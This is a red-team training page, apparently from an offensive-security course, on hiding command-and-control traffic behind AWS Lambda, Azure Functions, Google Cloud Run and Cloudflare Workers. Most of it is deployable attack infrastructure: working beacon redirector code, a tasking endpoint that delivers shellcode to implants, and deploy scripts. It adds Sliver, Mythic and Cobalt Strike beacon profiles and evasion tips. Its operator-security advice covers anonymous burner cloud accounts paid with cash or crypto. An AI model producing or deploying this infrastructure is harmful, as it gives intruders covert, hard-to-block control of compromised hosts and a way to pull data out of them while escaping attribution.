---
layout: training-page
title: "Cloud-Native C2 Infrastructure — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - cloud
  - serverless
  - lambda
  - azure-functions
  - cloud-run
  - cloudflare-workers
  - redirectors
page_key: "cloud-cloud-native-c2"
render_with_liquid: false
---

# Cloud-Native C2 Infrastructure

Between 2022 and 2026 the VPS-on-DigitalOcean redirector quietly stopped being the default. The reason is simple and uncomfortable for blue teams: legitimate AWS, Azure, GCP, and Cloudflare egress is already in the allow-list of nearly every enterprise on earth. Serverless C2 leans on that fact. There is no infrastructure to provision, no `apt update` cron, no SSH key to rotate, no IP to burn. The function spins up, takes a beacon request, hands it to the team server, and disappears. The callback domain is `*.lambda-url.us-east-1.on.aws` or `*.workers.dev` or `*.azurewebsites.net` — domains that already account for percent-of-internet traffic in any sufficiently large company.

The tradeoffs are real and you must price them in before you click deploy. Cloud providers log everything they touch. Billing exhaust is correlated to a payment method. Identities (IAM principals, Azure AD app registrations, GCP service accounts) are durable and traceable. Building this infrastructure carelessly produces a clean attribution chain from your beacon back to a real human. Building it well produces an attack surface that defenders cannot block without disrupting half their company.

This page covers the four cloud-native primitives in active operational use in 2026: AWS Lambda, Azure Functions, GCP Cloud Run / Cloud Functions, and Cloudflare Workers — plus updated domain-fronting realities, beacon profile examples, operator IAM hygiene, and the detection surface that remains visible to a competent blue team.

## Threat Model — Why This Works in 2026

The economic incentive for an enterprise to block `*.amazonaws.com` does not exist. S3 buckets, SES, SQS, Cognito, API Gateway endpoints, Lambda function URLs, ECS Fargate hostnames, EKS control planes, and dozens of internal SaaS products terminate on AWS-owned subdomains. The same is true of `*.azurewebsites.net` (App Service), `*.azurefd.net` (Front Door), `*.cloudfront.net`, `*.workers.dev`, `*.run.app`, and `*.functions.net`. A coarse-grained block at the egress proxy breaks Office 365 add-ins, Adobe licensing, Slack workspace federation, Microsoft Teams meeting bots, GitHub Actions runners pulling artifacts, and the half-dozen SaaS observability vendors every SRE org depends on.

The TLS-inspection story is worse for defenders. Many enterprise proxies (Zscaler, Netskope, Palo Alto Prisma Access) maintain explicit bypass lists for major cloud providers because:

- Cert pinning in cloud SDKs (boto3, Azure CLI, gcloud) breaks under MITM
- High-volume cloud APIs hit proxy CPU limits at scale
- Cloud provider terms of service prohibit unauthorized interception in some regions
- Microsoft 365 connectivity guidance explicitly requests TLS bypass for ranges like `*.outlook.com`, `*.office.com`, `*.protection.outlook.com`

So the TLS payload — your beacon — often crosses the egress boundary unread. Combine that with a host header that says `update.contoso.com` (your CNAME onto Cloudflare) and the connection looks indistinguishable from a Slack push or an Office 365 telemetry blip.

Where this stops working: orgs running selective TLS inspection on uncategorized destinations, orgs that geofence cloud regions (e.g., block `us-east-1` if their business is EU-only), and orgs running JA3/JA4 fingerprint hunts on beacon clients — none of these defeat cloud-native C2 entirely, but they reduce the noise budget significantly.

## AWS Lambda as Redirector

The cleanest entry point. Lambda Function URLs (released April 2022) give you an HTTPS endpoint on `*.lambda-url.<region>.on.aws` with zero infrastructure — no API Gateway, no ALB, no Route 53 entry required. Cost at low traffic is functionally zero (1M requests/month + 400,000 GB-seconds free tier).

```python
# lambda_function.py — Cobalt Strike / Sliver redirector
# Validates Malleable C2 profile signature, forwards to team server
import json
import os
import urllib.request
import urllib.parse

TEAMSERVER = os.environ["TEAMSERVER_URL"]      # e.g., https://10.0.5.4
EXPECTED_UA = os.environ["EXPECTED_UA"]        # full UA string from profile
EXPECTED_PATHS = os.environ["EXPECTED_PATHS"].split(",")  # /jquery-3.3.1.min.js,/api/v2/...
ALLOWED_GEO = os.environ.get("ALLOWED_GEO", "").split(",")  # ["US","GB","DE"]

DECOY = "https://www.microsoft.com/"

def lambda_handler(event, context):
    headers = {k.lower(): v for k, v in event.get("headers", {}).items()}
    path = event.get("rawPath", "/")
    method = event.get("requestContext", {}).get("http", {}).get("method", "GET")
    src_ip = event.get("requestContext", {}).get("http", {}).get("sourceIp", "")
    country = headers.get("cloudfront-viewer-country", "")  # only via CloudFront origin

    # Filter 1: User-Agent must match malleable profile exactly
    if headers.get("user-agent", "") != EXPECTED_UA:
        return {"statusCode": 302, "headers": {"Location": DECOY}}

    # Filter 2: URI must match a known beacon path
    if not any(path.startswith(p) for p in EXPECTED_PATHS):
        return {"statusCode": 302, "headers": {"Location": DECOY}}

    # Filter 3: Geofence (when fronted by CloudFront)
    if ALLOWED_GEO and ALLOWED_GEO != [""] and country not in ALLOWED_GEO:
        return {"statusCode": 404}

    # Forward to team server
    body = event.get("body", "")
    if event.get("isBase64Encoded"):
        import base64
        body = base64.b64decode(body)

    fwd_url = TEAMSERVER + path
    if event.get("rawQueryString"):
        fwd_url += "?" + event["rawQueryString"]

    req = urllib.request.Request(
        fwd_url,
        data=body if isinstance(body, bytes) else body.encode() if body else None,
        method=method,
    )
    # Pass through every header except hop-by-hop
    HOP = {"host", "connection", "content-length", "x-forwarded-for", "x-forwarded-proto"}
    for k, v in headers.items():
        if k not in HOP:
            req.add_header(k, v)

    ctx = __import__("ssl").create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = __import__("ssl").CERT_NONE  # team server uses self-signed

    try:
        with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
            return {
                "statusCode": resp.status,
                "headers": {h: v for h, v in resp.getheaders() if h.lower() not in HOP},
                "body": resp.read().decode("latin-1"),
                "isBase64Encoded": False,
            }
    except Exception:
        return {"statusCode": 502, "body": ""}
```

```bash
# Deploy with the AWS CLI (assumes burner profile already configured)
zip function.zip lambda_function.py

aws iam create-role --role-name c2-relay \
  --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'

aws iam attach-role-policy --role-name c2-relay \
  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole

aws lambda create-function \
  --function-name jquery-cdn \
  --runtime python3.12 \
  --role arn:aws:iam::<ACCT_ID>:role/c2-relay \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --timeout 10 \
  --memory-size 256 \
  --environment "Variables={TEAMSERVER_URL=https://10.0.5.4,EXPECTED_UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,EXPECTED_PATHS=/jquery-3.3.1.min.js}"

# Expose as a Function URL (no API Gateway needed)
aws lambda create-function-url-config \
  --function-name jquery-cdn \
  --auth-type NONE \
  --cors '{"AllowOrigins":["*"]}'

# Output: https://abc123xyz.lambda-url.us-east-1.on.aws/
```

### Function URL vs API Gateway

| Capability | Function URL | API Gateway HTTP API |
|---|---|---|
| Setup time | seconds | minutes |
| Domain | `<id>.lambda-url.<region>.on.aws` | `<id>.execute-api.<region>.amazonaws.com` (or custom) |
| Custom domain | requires CloudFront in front | native via ACM |
| WAF | not directly supported | yes |
| Request size cap | 6 MB | 10 MB |
| Cost | function invocation only | function + per-request gateway fee |
| Logging detail | CloudWatch (function) | CloudWatch (function + access logs) |

Use Function URL when you want zero attack surface beyond the function itself. Use API Gateway when you need custom domain + WAF + structured access logs (rare for offensive work — those are blue team features).

### Terraform skeleton

```hcl
# main.tf
resource "aws_iam_role" "c2_relay" {
  name = "c2-relay"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "lambda.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy_attachment" "basic_exec" {
  role       = aws_iam_role.c2_relay.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
}

resource "aws_lambda_function" "redirector" {
  function_name = "jquery-cdn"
  filename      = "function.zip"
  role          = aws_iam_role.c2_relay.arn
  handler       = "lambda_function.lambda_handler"
  runtime       = "python3.12"
  timeout       = 10
  memory_size   = 256

  environment {
    variables = {
      TEAMSERVER_URL  = var.teamserver_url
      EXPECTED_UA     = var.expected_ua
      EXPECTED_PATHS  = var.expected_paths
    }
  }
}

resource "aws_lambda_function_url" "redirector" {
  function_name      = aws_lambda_function.redirector.function_name
  authorization_type = "NONE"
}

output "endpoint" {
  value = aws_lambda_function_url.redirector.function_url
}
```

```bash
terraform init && terraform apply -auto-approve
# When the engagement ends:
terraform destroy -auto-approve
```

## Azure Functions as C2 Endpoint

Azure Functions on a Consumption plan give you `*.azurewebsites.net` — a domain so universally allowed that blocking it breaks Visual Studio Code, Teams, the Azure CLI, GitHub Codespaces, and most Microsoft developer tooling. The hard constraint is the **execution timeout**: 5 minutes on the default Consumption plan, 10 minutes if you raise it, unlimited on Premium / App Service plans (but Premium plans require a real subscription and produce a billing trail).

```csharp
// FunctionApp/Redirector.cs — .NET 8 isolated worker
using System.Net;
using Microsoft.Azure.Functions.Worker;
using Microsoft.Azure.Functions.Worker.Http;

public class Redirector
{
    private static readonly HttpClient _http = new HttpClient(new HttpClientHandler {
        ServerCertificateCustomValidationCallback = (m, c, ch, e) => true
    });

    [Function("beacon")]
    public async Task<HttpResponseData> Run(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = "{*path}")]
        HttpRequestData req, string path, FunctionContext ctx)
    {
        var teamServer = Environment.GetEnvironmentVariable("TEAMSERVER_URL");
        var expectedUa = Environment.GetEnvironmentVariable("EXPECTED_UA");
        var ua = req.Headers.TryGetValues("User-Agent", out var v) ? v.FirstOrDefault() : null;

        if (ua != expectedUa) {
            var redir = req.CreateResponse(HttpStatusCode.Redirect);
            redir.Headers.Add("Location", "https://www.microsoft.com/");
            return redir;
        }

        var fwd = new HttpRequestMessage(new HttpMethod(req.Method),
                  $"{teamServer}/{path}{req.Url.Query}");
        foreach (var h in req.Headers)
            if (!new[] {"Host","Connection","Content-Length"}.Contains(h.Key))
                fwd.Headers.TryAddWithoutValidation(h.Key, h.Value);

        if (req.Body.Length > 0) {
            fwd.Content = new StreamContent(req.Body);
        }

        var upstream = await _http.SendAsync(fwd);
        var resp = req.CreateResponse(upstream.StatusCode);
        foreach (var h in upstream.Headers)
            resp.Headers.TryAddWithoutValidation(h.Key, h.Value);
        await upstream.Content.CopyToAsync(resp.Body);
        return resp;
    }
}
```

```bash
# Deploy with the Azure CLI (burner subscription, prepaid credit)
az login --use-device-code
az group create --name rg-cdn --location eastus
az storage account create --name cdnstorage$RANDOM --resource-group rg-cdn --sku Standard_LRS
az functionapp create --resource-group rg-cdn --consumption-plan-location eastus \
  --runtime dotnet-isolated --functions-version 4 --name jquery-cdn-$RANDOM \
  --storage-account cdnstorage$RANDOM --os-type Linux

# Configure environment
az functionapp config appsettings set --name jquery-cdn-XXXX --resource-group rg-cdn \
  --settings TEAMSERVER_URL=https://10.0.5.4 EXPECTED_UA="Mozilla/5.0 ..."

func azure functionapp publish jquery-cdn-XXXX
# Endpoint: https://jquery-cdn-XXXX.azurewebsites.net/api/<path>
```

### The 5-minute timeout problem

Long-running tasks (download_file with a 200 MB blob, screenshot streams, RDP relays) will hit the Consumption plan timeout. Options:

- **Chunk at the agent**: configure the beacon to split large transfers into many small POSTs (Cobalt Strike `set tasks_max_size` in the malleable profile)
- **Switch tier**: Functions Premium has no timeout but bills continuously
- **Pair with Azure Blob Storage**: agent uploads to a SAS-signed blob URL; the function only carries metadata
- **Use Container Apps instead**: stateless, hourly bill, no timeout — closer to ECS Fargate in shape

### App registration as durable identity

For ops that span weeks, an Azure AD app registration (service principal) lets you regenerate function host keys and rotate Function App settings without re-authenticating the human operator. Treat the app registration's client secret like a long-lived token — store it in a password manager, never commit it. The audit trail on the burner tenant will record every `Update-AzWebApp` call against this principal, so use a tenant you intend to abandon.

## Google Cloud Run / Cloud Functions

Cloud Run gives you a containerized HTTP endpoint on `*.run.app` with the same allow-list dynamics. The deploy is one command and you pay nothing when idle (scales to zero).

```bash
# Dockerfile (any language; example: Go)
cat > Dockerfile << 'EOF'
FROM golang:1.22-alpine AS build
WORKDIR /src
COPY . .
RUN go build -o /redirector .

FROM gcr.io/distroless/static
COPY --from=build /redirector /redirector
ENTRYPOINT ["/redirector"]
EOF

# Build and deploy
gcloud auth login
gcloud config set project burner-proj-12345
gcloud run deploy jquery-cdn \
  --source . \
  --region us-central1 \
  --allow-unauthenticated \
  --set-env-vars TEAMSERVER_URL=https://10.0.5.4,EXPECTED_UA="Mozilla/5.0 ..."

# Output: https://jquery-cdn-<hash>-uc.a.run.app
```

```go
// main.go — minimal Cloud Run beacon relay
package main

import (
    "crypto/tls"
    "io"
    "net/http"
    "os"
)

var client = &http.Client{
    Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
}

func handler(w http.ResponseWriter, r *http.Request) {
    if r.UserAgent() != os.Getenv("EXPECTED_UA") {
        http.Redirect(w, r, "https://www.google.com/", http.StatusFound)
        return
    }
    fwd, _ := http.NewRequest(r.Method, os.Getenv("TEAMSERVER_URL")+r.URL.Path+"?"+r.URL.RawQuery, r.Body)
    for k, v := range r.Header {
        fwd.Header[k] = v
    }
    resp, err := client.Do(fwd)
    if err != nil { w.WriteHeader(502); return }
    defer resp.Body.Close()
    for k, v := range resp.Header { w.Header()[k] = v }
    w.WriteHeader(resp.StatusCode)
    io.Copy(w, resp.Body)
}

func main() {
    http.HandleFunc("/", handler)
    http.ListenAndServe(":"+os.Getenv("PORT"), nil)
}
```

Cloud Functions Gen 2 sits on Cloud Run under the hood — pick whichever surface feels right. Gen 2 gives you trigger types beyond HTTP (Pub/Sub, GCS object created), which is useful for staged callbacks: drop a file in a bucket, fire a function, beacon responds.

### BeyondCorp considerations

If the target uses Google Workspace and BeyondCorp Enterprise as their egress proxy, default `*.run.app` access is allowed but logged. BeyondCorp's contextual access engine can correlate destination categories with user role — engineers hitting `*.run.app` is normal noise; accounting users hitting `*.run.app` is a flag. Pick your callback domain to match the likely role of the compromised user.

## Cloudflare Workers Abuse

Workers are the most operationally pleasant option in 2026. The Worker script runs at every Cloudflare edge POP, the free tier covers 100,000 requests/day with no credit card on file, and `*.workers.dev` enjoys the same broad trust as `*.cloudflare.com`. Unlike Lambda/Functions/Run, Workers can hold **state** via Workers KV (eventually consistent) or Durable Objects (strongly consistent) — which makes them suitable for a full beacon endpoint, not just a redirector.

```javascript
// src/index.js — Worker as a complete tasking endpoint with KV-backed queue
// Wrangler: bind a KV namespace as TASKS, set EXPECTED_UA via secret

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const ua = request.headers.get("User-Agent") || "";

    if (ua !== env.EXPECTED_UA) {
      return Response.redirect("https://www.microsoft.com/", 302);
    }

    // Beacon check-in: GET /api/v2/beacon/<agent_id>
    const m = url.pathname.match(/^\/api\/v2\/beacon\/([a-f0-9]{16})$/);
    if (m && request.method === "GET") {
      const agentId = m[1];
      const task = await env.TASKS.get(`task:${agentId}`);
      if (task) {
        await env.TASKS.delete(`task:${agentId}`);
        return new Response(task, { headers: { "Content-Type": "application/javascript" } });
      }
      return new Response("", { status: 204 });
    }

    // Task result: POST /api/v2/result/<agent_id>
    const r = url.pathname.match(/^\/api\/v2\/result\/([a-f0-9]{16})$/);
    if (r && request.method === "POST") {
      const agentId = r[1];
      const body = await request.text();
      await env.TASKS.put(`result:${agentId}:${Date.now()}`, body, { expirationTtl: 86400 });
      return new Response("", { status: 200 });
    }

    return new Response("Service Unavailable", { status: 503 });
  }
};
```

```toml
# wrangler.toml
name = "jquery-cdn"
main = "src/index.js"
compatibility_date = "2026-01-01"
workers_dev = true

[[kv_namespaces]]
binding = "TASKS"
id = "<kv-namespace-id-from-wrangler-kv-namespace-create>"

# Optional: custom domain
# [[routes]]
# pattern = "update.contoso.com/*"
# zone_name = "contoso.com"
```

```bash
# Deploy
bun install -g wrangler
wrangler login
wrangler kv:namespace create TASKS
# Paste the returned id into wrangler.toml

wrangler secret put EXPECTED_UA
# Paste your malleable C2 User-Agent

wrangler deploy
# https://jquery-cdn.<your-account>.workers.dev/
```

Operator pushes a task into KV via `wrangler kv:key put --binding TASKS task:abc123def456 'shellcode...'`; the agent calling in on its next sleep pulls and clears it. For higher-fidelity ops, run an actual team server and use the Worker as a proxy (the simpler pattern, identical to the Lambda/Functions/Run examples above).

### TLS fingerprint considerations

Cloudflare's edge presents its own TLS stack to the agent — this is good (the agent's JA3/JA4 looks like Cloudflare-fronted traffic) and bad (the connection from your team server to Cloudflare is fingerprintable if a defender ever gets origin-side telemetry, which they generally do not).

When the beacon itself terminates at the Worker (no upstream team server), there is no second-hop TLS — the entire chain is Cloudflare. This is operationally simpler but means **all beacon data lives in Cloudflare KV** until you delete it. Treat KV as adversarial storage; encrypt task payloads at the operator with a symmetric key the Worker never sees.

## Domain Fronting Updates 2024-2026

Traditional SNI/Host mismatch fronting (the original "send `SNI: cloudfront.net`, `Host: c2.attacker.com`" trick) has been dead on AWS and GCP since April 2018 and on Cloudflare since 2019. Reports of fronting "still working" on those platforms in 2026 are almost always:

- Cloudflare Workers (mechanism is trust-of-edge-IP, not SNI mismatch — covered above)
- Misconfigured CDN that does not enforce host validation (rare; document the misconfiguration, expect it to be patched)
- Azure Front Door with specific routing rules that re-introduce the mismatch surface

**Azure Front Door** remains the most interesting remaining surface. When you configure a Front Door profile with multiple custom domains pointing at the same backend pool, and you do not enable strict host header validation, the edge will accept arbitrary host headers as long as the SNI resolves to a Front Door endpoint. Outflank documented this pattern in detail in 2023-2024 and Microsoft has tightened defaults since — verify behavior on the specific profile you provision.

**Fastly** allows host-rewrite VCL but enforces SNI/host matching by default since 2019. Custom VCL can re-allow the mismatch in narrow cases; this requires a paid plan and a TAM relationship, which is uncomfortable infrastructure for offensive work.

**Smaller CDN providers** (BunnyCDN, KeyCDN, StackPath, regional providers) vary. Survey the provider before assuming. Their domains do not enjoy the same allow-list reputation, which is the entire point of fronting — so a "working" fronting endpoint on a niche CDN may be worth less than a non-fronted Cloudflare Worker.

The Outflank "Cloud-Based Redirectors" research and the MDSec "C2 in the Cloud" writeups remain the best published references on current state.

## Building a Serverless Beacon

### Sliver — HTTPS C2 over Lambda URL

```bash
# Team server (private network):
./sliver-server
[server] > https --lhost 0.0.0.0 --lport 8443 --domain redirected-via-lambda

# Generate beacon
[server] > generate beacon --http https://abc123xyz.lambda-url.us-east-1.on.aws \
                          --os windows --arch amd64 --save /tmp/beacon.exe \
                          --seconds 90 --jitter 30
```

The Lambda function above forwards to `TEAMSERVER_URL=https://<team-server-private-ip>:8443` over the VPC peering / VPN you've stood up between the Lambda VPC and the team server. For lab work skip the VPC and use a static team server public IP with IP-restricted security group allowing only the Lambda's egress NAT IP.

### Mythic — apollo over Cloudflare Worker profile

```yaml
# Mythic c2 profile excerpt — http profile pointed at Worker URL
callback_host: "jquery-cdn.<account>.workers.dev"
callback_port: 443
callback_interval: 60
callback_jitter: 30
encrypted_exchange_check: true
get_uri: "api/v2/beacon"
post_uri: "api/v2/result"
query_path_name: ""
user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

apollo (the .NET agent) reads this profile at build time and bakes the Worker URL into the agent. The Worker's URI pattern check must match `get_uri` / `post_uri` exactly.

### Cobalt Strike — Malleable C2 profile snippet for Cloudflare Workers

```
set sleeptime "60000";
set jitter "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v2/beacon/abc123def4567890";
    client {
        header "Accept" "text/javascript, application/javascript";
        header "Referer" "https://contoso.com/";
        metadata {
            base64url;
            parameter "v";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v2/result/abc123def4567890";
    client {
        header "Content-Type" "application/json";
        output {
            base64url;
            print;
        }
    }
    server { output { print; } }
}

https-certificate {
    set keystore "cloudflare-frontend.store";
    set password "operator-only";
}
```

Pair this with the Worker example above and the URI patterns line up. The Worker handles the `/api/v2/beacon/<id>` and `/api/v2/result/<id>` routes; everything else returns 503.

## Operator IAM and OPSEC

Every cloud provider ties resources to a billing identity. Treating that identity carelessly is how engagements get attributed.

**Burner-account hygiene:**

- Never use a personal credit card. Use a prepaid Visa purchased with cash, or BitLaunch / similar services that accept crypto, or a corporate card under a fully separate engagement-tracked account
- Never use your real name on the account. Names get cross-referenced against threat intel pivots
- Never reuse phone numbers. SMS-receive services (sms-activate, smsreceivefree) provide ephemeral numbers; rotate per account
- Never log in from your real IP. Use the same VPN / VPS jumpbox you use for every other operator action

**AWS Organizations as a throwaway-account factory:** A single AWS payer account can spawn sub-accounts at will. Each sub-account has its own credit allocation, IAM root, and isolated CloudTrail. When a sub-account is burned, close it; the payer continues. The payer must still be a clean identity — but the operational accounts beneath it can rotate weekly.

**The cloud-account purchasing market exists** — sellers on certain forums offer aged AWS, Azure, and GCP accounts with established billing history. Treat these as adversarial: you do not know what the previous owner ran, you do not know what is logged against the identity, and you may be inheriting an account that is already on a threat intel watchlist. Knowing this market exists is useful for reporting; using it is operationally reckless.

**Least-privilege IAM on the function role:**

```hcl
# The redirector role should be able to log to CloudWatch and nothing else.
# No S3, no DynamoDB, no Lambda invoke, no IAM read — anything broader is
# loot for a defender who pivots into the burner account.
resource "aws_iam_role_policy" "c2_relay_minimal" {
  role = aws_iam_role.c2_relay.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = ["logs:CreateLogGroup","logs:CreateLogStream","logs:PutLogEvents"]
      Resource = "arn:aws:logs:*:*:*"
    }]
  })
}
```

**Killswitch automation:** Every deployment script should have a paired teardown. `terraform destroy`, `az group delete --name rg-cdn --yes`, `gcloud projects delete burner-proj-12345`, `wrangler delete --name jquery-cdn`. Wire the teardown to an engagement end-date so abandoned infrastructure does not sit beaconing into a dead team server for months.

## Detection Surface — What Blue Still Sees

Cloud-native C2 is not invisible. The visible signals, in rough order of frequency:

```
# JA3 / JA4 fingerprints
# The beacon's TLS client (Cobalt Strike's WinHTTP, Sliver's Go stdlib, Mythic's
# apollo/poseidon) has a JA4 hash. Cloudflare/Lambda/Front Door terminate TLS,
# so the defender's view of the client JA4 stops at the user's endpoint —
# but EDR with TLS introspection (CrowdStrike, SentinelOne) sees it pre-CDN.
# Mitigation: malleable profile TLS settings, custom HTTP stacks, or proxy
# beacon through wininet (which inherits the host's curl/Edge fingerprint).

# SNI vs Host mismatch
# Dead on the major CDNs for traditional fronting (covered above). Still
# worth checking on niche providers and on misconfigured Front Door profiles.
# Zeek logs SSL + HTTP separately; correlation by connection UID surfaces
# mismatches.

# Beacon timing patterns
# Even a perfect Worker proxy cannot hide the fact that an endpoint reaches
# out to <cdn> every 60s ±30s for hours. NetFlow / Zeek conn.log on the
# egress shows the cadence. Mitigation: large jitter (set jitter "50" or
# higher), randomized sleeps, work-hours scheduling so the beacon goes quiet
# overnight.

# Cloud DNS lookup volume
# One source host resolving *.workers.dev or *.lambda-url.<region>.on.aws
# repeatedly while no other host on the LAN does is anomalous. Most enterprise
# DNS aggregates (Cisco Umbrella, Zscaler) bucket by host. Spread across
# many destination subdomains (Workers route patterns help).

# CDN provider cooperation
# Large engagements against well-resourced targets eventually involve the
# target's CDN account team. Cloudflare, AWS, Azure will respond to abuse
# reports and may terminate the Worker / Function / Distribution. This is
# the most permanent burn signal — rotate provider and identity together.

# Certificate Transparency
# *.workers.dev and *.azurewebsites.net subdomains do NOT appear in CT logs
# (they share the wildcard cert). Custom domains DO. If you front a Worker
# with update.contoso-lookalike.com, that cert appears in crt.sh within
# minutes of issuance. Threat intel scrapes CT continuously.
```

The reliable detection ceiling for a competent SOC is "we know there is C2 to *cloud-provider*; we cannot block *cloud-provider*; we hunt for it at the endpoint with EDR." This is exactly the position cloud-native C2 is engineered to produce — pushing the fight from the network layer (where blue traditionally wins) to the endpoint layer (where the agent's evasion posture is what matters).

## Resources

- Outflank — Cloud-Based Redirectors research — `outflank.nl/blog/`
- MDSec — Serverless C2 — `mdsec.co.uk/2020/02/leveraging-serverless-functions-for-c2-purposes/`
- Specter Ops — Abusing Azure Functions — `posts.specterops.io/`
- Cobalt Strike Documentation — Malleable C2 — `hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/`
- Cloudflare Workers Reference — `developers.cloudflare.com/workers/`
- AWS Lambda Function URLs — `docs.aws.amazon.com/lambda/latest/dg/lambda-urls.html`
- Azure Functions Documentation — `learn.microsoft.com/en-us/azure/azure-functions/`
- Google Cloud Run Documentation — `cloud.google.com/run/docs`
- BishopFox — Cloud Penetration Testing — `bishopfox.com/blog/`
- SpecterOps — Operational Guidance on Azure Front Door — `posts.specterops.io/`
- Sliver Wiki — HTTP/S Listeners — `github.com/BishopFox/sliver/wiki`
- Mythic — Profile Configuration — `docs.mythic-c2.net/`
- BC-SECURITY — Empire HTTP Malleable Listeners — `github.com/BC-SECURITY/Empire`
